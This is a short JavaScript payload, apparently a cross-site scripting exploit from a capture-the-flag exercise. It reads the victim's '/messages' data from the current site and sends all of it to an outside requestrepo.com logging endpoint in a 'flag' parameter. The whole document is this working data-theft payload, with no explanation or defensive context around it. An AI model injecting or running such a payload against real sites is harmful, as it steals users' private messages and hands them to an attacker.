fetch('/messages')
  .then(r => r.json())
  .then(d => fetch('https://ntqibotq.requestrepo.com/log?flag=' + encodeURIComponent(JSON.stringify(d)), { mode: 'no-cors' }));
